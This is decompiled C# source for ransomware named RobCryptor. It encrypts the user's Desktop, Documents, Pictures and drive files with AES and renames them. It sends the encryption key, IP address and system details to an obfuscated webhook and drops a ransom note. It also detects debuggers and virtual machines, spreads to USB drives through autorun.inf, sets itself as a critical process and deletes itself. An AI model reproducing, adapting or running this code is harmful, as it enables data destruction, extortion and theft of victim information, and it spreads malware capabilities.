using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace RobCryptor;

internal static class Program
{
	private static string EX6jIRLatPmpbSTRnjRNvCv = "";

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool IsDebuggerPresent();

	[DllImport("kernel32.dll", SetLastError = true)]
	private static extern bool CheckRemoteDebuggerPresent(IntPtr Handle, ref bool RemoteDebugChecking);

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern bool RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

	private static IntPtr GetModuleHandle(string ModuleName)
	{
		foreach (ProcessModule module in Process.GetCurrentProcess().Modules)
		{
			if (module.ModuleName!.ToLower().Contains(ModuleName.ToLower()))
			{
				return module.BaseAddress;
			}
		}
		return IntPtr.Zero;
	}

	private static byte[] RIJyPvSB9QNrBnDBnvhc(byte[] bytesToBeEncrypted, byte[] passwordBytes)
	{
		byte[] result = null;
		byte[] salt = new byte[9] { 1, 2, 3, 4, 5, 6, 7, 8, 9 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			aesCryptoServiceProvider.KeySize = 256;
			aesCryptoServiceProvider.BlockSize = 128;
			aesCryptoServiceProvider.Key = rfc2898DeriveBytes.GetBytes(aesCryptoServiceProvider.KeySize / 8);
			aesCryptoServiceProvider.IV = rfc2898DeriveBytes.GetBytes(aesCryptoServiceProvider.BlockSize / 8);
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		return result;
	}

	private static void iXTSPrlggAnYOvhoOo0zEHWu(string KASDKASK, string KAKSKDDA)
	{
		byte[] bytesToBeEncrypted = File.ReadAllBytes(KASDKASK);
		byte[] bytes = Encoding.UTF8.GetBytes(KAKSKDDA);
		bytes = SHA256.Create().ComputeHash(bytes);
		byte[] bytes2 = RIJyPvSB9QNrBnDBnvhc(bytesToBeEncrypted, bytes);
		File.WriteAllBytes(KASDKASK, bytes2);
	}

	public static string zSFkMC1AUzoszShSlt5ct(int KeyLength)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < KeyLength--)
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZ*!@=&?&/abcdefghijklmnopqrstuvwxyz1234567890";
			stringBuilder.Append(text[random.Next(text.Length)]);
		}
		return stringBuilder.ToString();
	}

	public static string qXSx2pLjj6fcU9grUCb6()
	{
		int num = 16;
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < num--)
		{
			string text = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
			stringBuilder.Append(text[random.Next(text.Length)]);
		}
		return stringBuilder.ToString();
	}

	private static void PostDataToWebHook(string Data, string WebHook)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Expected O, but got Unknown
		//IL_003b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0045: Expected O, but got Unknown
		try
		{
			HttpClient val = new HttpClient();
			Dictionary<string, string> dictionary = new Dictionary<string, string>
			{
				{ "content", Data },
				{
					"username",
					SsdOlol("M6noZJvlZ6IbQEQohtBduQ==", "Q0&N9N?yWtakR81sx!lV@XS3", "sL29PIxF4sKPeiHM")
				}
			};
			val.PostAsync(WebHook, (HttpContent)new FormUrlEncodedContent((IEnumerable<KeyValuePair<string, string>>)dictionary));
		}
		catch
		{
		}
	}

	private static string SsdOlol(string DataToDecrypt, string KeyToDecryptWith, string IVKeyToDecryptWith)
	{
		byte[] array = Convert.FromBase64String(DataToDecrypt);
		using SHA256CryptoServiceProvider sHA256CryptoServiceProvider = new SHA256CryptoServiceProvider();
		byte[] key = sHA256CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(KeyToDecryptWith));
		using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider
		{
			Key = key,
			Mode = CipherMode.CBC,
			Padding = PaddingMode.PKCS7
		};
		byte[] array2 = (aesCryptoServiceProvider.IV = Encoding.ASCII.GetBytes(IVKeyToDecryptWith));
		ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor();
		byte[] bytes2 = cryptoTransform.TransformFinalBlock(array, 0, array.Length);
		return Encoding.UTF8.GetString(bytes2);
	}

	private static string GetIPAddress()
	{
		string ipString = new WebClient().DownloadString(SsdOlol("DD1n7YH1q4L+osC4uOujcw==", "bTKzfKyfA20jkfiW7BZU0/uY", "MmL2@IMiAL6vHblh")).Replace("\\r\\n", string.Empty).Replace("\\n", string.Empty)
			.Trim();
		IPAddress iPAddress = IPAddress.Parse(ipString);
		return iPAddress.ToString();
	}

	private static void EncryptionThread()
	{
		//IL_02c3: Unknown result type (might be due to invalid IL or missing references)
		//IL_02cd: Expected O, but got Unknown
		//IL_02c8: Unknown result type (might be due to invalid IL or missing references)
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			try
			{
				string text = zSFkMC1AUzoszShSlt5ct(70);
				try
				{
					string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
					string[] files = Directory.GetFiles(folderPath, "*", SearchOption.AllDirectories);
					string[] array2 = files;
					foreach (string text2 in array2)
					{
						try
						{
							iXTSPrlggAnYOvhoOo0zEHWu(text2, text);
							File.Move(text2, text2 + "." + SsdOlol("zWgB6bYi4CbRDIK/Gujd8w==", "Em1PILBo*YUAUEDuD7j&LT&W", "ddJqve&Wy0!DnL!V"));
						}
						catch
						{
						}
					}
				}
				catch
				{
					goto end_IL_0017;
				}
				try
				{
					string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal);
					string[] files2 = Directory.GetFiles(folderPath2, "*", SearchOption.AllDirectories);
					string[] array3 = files2;
					foreach (string text3 in array3)
					{
						try
						{
							iXTSPrlggAnYOvhoOo0zEHWu(text3, text);
							File.Move(text3, text3 + "." + SsdOlol("zWgB6bYi4CbRDIK/Gujd8w==", "Em1PILBo*YUAUEDuD7j&LT&W", "ddJqve&Wy0!DnL!V"));
						}
						catch
						{
						}
					}
				}
				catch
				{
					goto end_IL_0017;
				}
				try
				{
					string folderPath3 = Environment.GetFolderPath(Environment.SpecialFolder.MyPictures);
					string[] files3 = Directory.GetFiles(folderPath3, "*", SearchOption.AllDirectories);
					string[] array4 = files3;
					foreach (string text4 in array4)
					{
						try
						{
							iXTSPrlggAnYOvhoOo0zEHWu(text4, text);
							File.Move(text4, text4 + "." + SsdOlol("zWgB6bYi4CbRDIK/Gujd8w==", "Em1PILBo*YUAUEDuD7j&LT&W", "ddJqve&Wy0!DnL!V"));
						}
						catch
						{
						}
					}
				}
				catch
				{
					goto end_IL_0017;
				}
				try
				{
					string path = driveInfo.Name.Replace("C:\\", string.Empty);
					string[] files4 = Directory.GetFiles(path, "*", SearchOption.AllDirectories);
					string[] array5 = files4;
					foreach (string text5 in array5)
					{
						try
						{
							iXTSPrlggAnYOvhoOo0zEHWu(text5, text);
							File.Move(text5, text5 + "." + SsdOlol("zWgB6bYi4CbRDIK/Gujd8w==", "Em1PILBo*YUAUEDuD7j&LT&W", "ddJqve&Wy0!DnL!V"));
						}
						catch
						{
						}
					}
				}
				catch
				{
					goto end_IL_0017;
				}
				string text6 = qXSx2pLjj6fcU9grUCb6();
				EX6jIRLatPmpbSTRnjRNvCv = SsdOlol(SsdOlol("RJ49c0fwozFE1CZQsYcFF+l/5zJGo+0bVqu4tt7RQOPBErahr0HF4SaExUOapu4t8r0c5VGjk5A3/KFNcBbRGSXzbhwhkyer4p7MWACkHOU8naEWTSOwenMgnc2BHNqaWHwNZusgjw7DgwelYzhm2Y/haUEW2g3KZpSa5ANf8CJyO6/rszd61En5m/XdaZdF5oO00pljU0/wnfW/XZnM77L2jmRWWk8VutVf38ifdtg=", "Rx&FBn19FJ8PsPEL9g7fPso8", "JE09fB&6tWhahggu"), "KYW@lSFbp94&twDeTaOxR=MW", "RblWY7pnsIhv&D?a");
				RegistryKey registryKey = Registry.LocalMachine.CreateSubKey(SsdOlol("K/KkhDAc4lyHyAshkKavwODssE27Bn3YUDC+5EO72hxGhSmUfehlxml5Z5mqVIoM", "f25nYeNDFsN1/&bp=ws&?hCB", "dDQqHutTLygAhhgX"));
				object value = registryKey.GetValue(SsdOlol("yajBiU3tKuFN9ijSmXtOQg==", "HCGT@srSx9fvraIQ8E@gOa@H", "dDQqHutTLygAhhgX"));
				object value2 = registryKey.GetValue(SsdOlol("2jH/VTmQrXkEzMRKo8E5Yg==", "BvjanKI431O/6s&Y=B1EPZ&d", "dDQqHutTLygAhhgX"));
				object value3 = registryKey.GetValue(SsdOlol("LfOEhaejBjYP4e12F0b03Q==", "kOgObRBvBVOm!0&MWiS2TcOY", "dDQqHutTLygAhhgX"));
				object value4 = registryKey.GetValue(SsdOlol("cM9mNWa5L9ljenG/YR0e3Q==", "BY6R4v6GX?Qk3kTV*azp@6@2", "dDQqHutTLygAhhgX"));
				ManagementObjectEnumerator enumerator = new ManagementObjectSearcher(new ObjectQuery("SELECT * FROM Win32_OperatingSystem")).Get().GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						DriveInfo[] drives2 = DriveInfo.GetDrives();
						DriveInfo[] array6 = drives2;
						foreach (DriveInfo driveInfo2 in array6)
						{
							PostDataToWebHook("**Machine With The Name \"" + Environment.UserName + "\" Have been infected successfully.**```\nEncryption Key: " + text + "\nIP Address: " + GetIPAddress() + "\nUserName: " + Environment.UserName + "\nIs The Machine 64-bit type: " + Environment.Is64BitOperatingSystem + "\nTotal RAM in Bytes: " + current.get_Item("TotalVisibleMemorySize")?.ToString() + "\nOS Version: " + value4.ToString() + "\nDisks: " + driveInfo2.Name + "\nOperating System: " + value.ToString() + "\nOS Build: " + value2.ToString() + "\nRegistered Owner: " + value3.ToString() + "\nID: " + text6 + "\n```", EX6jIRLatPmpbSTRnjRNvCv);
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
				string text7 = SsdOlol("7tmhIB7XTfrsfP9BDl95sF2ufRW7zQchyyqmm5XcASPPKeUJjfll3kzbNpmQE5PU", "XRhvKhXPXCc45e!gDQg/6Xx0", "IGMxxL6&pT=CuU@B");
				string text8 = SsdOlol("maqQTn463SA39uFq8NIUqdPEHeQpiwMkpIQsWztLooa2LySbV8XJNMNdZcRxfUIVwIJ5VBrhHCHMczLX55n+pXC1FAuX/cMI8cb6yZ4v1OV7KE1+fE85sSayNdqw/ZhlQEmmmO80GacxoGrTZ0iEcc3fickNh+2CWdCv8cDyB6E=", "2WMhAKr7k0LuabZ8mZRJ@EPK", "IGMxxL6&pT=CuU@B");
				string text9 = SsdOlol("OrPm53SUuDVaSnQsMiO0+Szml1uTR4ZDe9N7nffVCKAqLaztchOkqMhO0ITLYHMQZ3hQ8ZCrVnp6N0CASvUzKxAYqh4JAWMGeNIbzUafCIeNg5XYu8NHlssCXnCds9mV8QYQYxsOIhY8RAE5eKdnVf6AWQqPOnEIp/oO5tQaNvDJ65ZqPUR8yrgTBQv8Z+Frl+77TRLlf/KyD9LsceYTbmQ4XporxaOvsh2pc4sndsevOZ1Fm4vXWHeG/Q9tu5+8jyMGQacmlQQt0fKhpG/MBQ==", "gQB*dVM5&7&R/98C?ZQNgkxQ", "QC8fz&TU?pOU/9uC");
				string text10 = SsdOlol("o2O1Y6F8qk2CLqvj28P/Ebur2al/V/X1VGlxD6wK8OVaQHWck5NpRJVniPTOoFtjOgmrCdTJqMK7445n9V7LLP1Pcok8DJNQHxCDqVTUVrXdaT73bE1lh/cvQdAPav3pW3uZbfPxCCtNOa6aF2zLKZJAnslIDZmULAp6QkHiS+E=", "S0R7H9Ha*L@NGKCA?t&fFb0d", "QC8fz&TU?pOU/9uC");
				string text11 = SsdOlol("ZxrPJ3zlDzsvtzZZhFzs5vPrNQn/M5fsMhoZH9TJJ2MyVFKwvVJq3w4FH1VZlh/x", "V?LS=p7z8L6SruT&t4W@LXZ2", "IGMxxL6&pT=CuU@B");
				string text12 = SsdOlol("8xiPzImEY9PiaAtpbGnqaMtLyDsCfOFRGIoy8IM+oNu3TNaZRmZlfF646GDTsLlwW1c5uXhTFqKgZVgxXwjzG3zVtxSqM33MUHOLj5Ix/AQ=", "PKFY!hnzpNc18GXeXYU?a65e", "IGMxxL6&pT=CuU@B");
				File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RobCryptor.txt", text7 + "\n" + text8 + " " + text9 + " " + text10 + "\n\n" + text11 + text6 + "\n\n" + text12);
				Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\RobCryptor.txt");
				Process.EnterDebugMode();
				RtlSetProcessIsCritical(0u, 0u, 0u);
				Process.LeaveDebugMode();
				Process.Start("cmd.exe", "/c taskkill /IM " + Process.GetCurrentProcess().ProcessName + " /F && del \"" + Application.get_ExecutablePath() + "\"");
				end_IL_0017:;
			}
			catch
			{
			}
		}
	}

	public static string SADAS(string JJSAJA)
	{
		using MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(JJSAJA));
		StringBuilder stringBuilder = new StringBuilder();
		for (int i = 0; i < array.Length; i++)
		{
			stringBuilder.Append(array[i].ToString("x2"));
		}
		return stringBuilder.ToString();
	}

	private static bool Dsxzas()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		ManagementObjectSearcher val = new ManagementObjectSearcher("Select * from Win32_ComputerSystem");
		try
		{
			ManagementObjectCollection val2 = val.Get();
			try
			{
				ManagementObjectEnumerator enumerator = val2.GetEnumerator();
				try
				{
					while (enumerator.MoveNext())
					{
						ManagementBaseObject current = enumerator.get_Current();
						string text = current.get_Item("Manufacturer").ToString()!.ToLower();
						if ((text == "microsoft corporation" && current.get_Item("Model").ToString()!.ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || current.get_Item("Model").ToString() == "VirtualBox")
						{
							return true;
						}
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			finally
			{
				((IDisposable)val2)?.Dispose();
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		return false;
	}

	private static void USBSpread()
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		DriveInfo[] array = drives;
		foreach (DriveInfo driveInfo in array)
		{
			try
			{
				if (driveInfo.DriveType == DriveType.Removable)
				{
					StreamWriter streamWriter = new StreamWriter(driveInfo.Name + "autorun.inf");
					streamWriter.WriteLine("[autorun]\n");
					streamWriter.WriteLine(SsdOlol("0eXjxrDjs/BN3fkVYIKz3l9SobWpT20F3i8BwDsxpw0=", "MlQD/58&phs741KTCsLwAPGz", "a8ELT2V*DxXjcUG1"));
					streamWriter.WriteLine(SsdOlol("kCnue3IsfPdFSy86CFKcrIUzezv/VqltnkRnOgJ1psw=", "PE5XtWvt!lGnq?wb9/4zf2XN", "KK6@9*8EcG3cga12"));
					streamWriter.Close();
					File.SetAttributes(driveInfo.Name + "autorun.inf", File.GetAttributes(driveInfo.Name + "autorun.inf") | FileAttributes.Hidden);
					File.Copy(Application.get_ExecutablePath(), driveInfo.Name + SsdOlol("QNJfQ9X6WCZOyb5OMPw5DA==", "R4YqbM@FURAcHK&qyoEsdyDY", "a8ELT2V*DxXjcUG1"), overwrite: true);
					File.SetAttributes(driveInfo.Name + SsdOlol("QNJfQ9X6WCZOyb5OMPw5DA==", "R4YqbM@FURAcHK&qyoEsdyDY", "a8ELT2V*DxXjcUG1"), File.GetAttributes(driveInfo.Name + SsdOlol("QNJfQ9X6WCZOyb5OMPw5DA==", "R4YqbM@FURAcHK&qyoEsdyDY", "a8ELT2V*DxXjcUG1")) | FileAttributes.Hidden | FileAttributes.System);
				}
			}
			catch
			{
			}
		}
	}

	[STAThread]
	private static void Main()
	{
		bool RemoteDebugChecking = false;
		CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref RemoteDebugChecking);
		if (Debugger.IsAttached || IsDebuggerPresent() || RemoteDebugChecking || GetModuleHandle("SbieDll.dll") != IntPtr.Zero || Dsxzas())
		{
			Application.Exit();
			return;
		}
		if (SADAS(Environment.UserName) == SsdOlol("/KeLUIDw195iLywNbiuIFnaD28ZWrVTLBxYLIWSnwjgKyKqfzKSHUgXt357Y0WD9", "R2sPHRfpR6mNl98U2A0adEFM", "sL29PIxF4sKPeiHM"))
		{
			Application.Exit();
			return;
		}
		USBSpread();
		Thread thread = new Thread(EncryptionThread);
		thread.Priority = ThreadPriority.Highest;
		thread.Start();
	}
}
